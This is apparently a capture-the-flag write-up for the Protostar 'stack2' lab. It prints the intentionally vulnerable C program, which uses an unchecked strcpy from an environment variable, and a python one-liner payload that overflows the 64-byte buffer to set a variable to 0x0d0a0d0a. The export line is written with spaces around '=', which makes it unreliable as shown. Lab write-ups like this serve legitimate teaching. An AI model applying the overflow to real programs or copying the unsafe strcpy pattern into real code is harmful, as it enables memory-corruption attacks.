/opt/protostar/bin/stack2

#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}

Again, there is a buffer overflow in strcpy function. If our environment variable exceeds 64 bytes we can overwrite 'modified' value. This time expected value has non-writable characters 0d and 0a. It doesn't mean that we can't use them. We just can't directly type them from keyboard. But we can print them to stdout using i.e. python or echo.

First let's set up environment variable:
> export GREENIE = `python -c "print('A'*64 + '\x0a\x0d\x0a\x0d')"`

Now we can try running the program:
> ./stack2
> you have correctly modified the variable
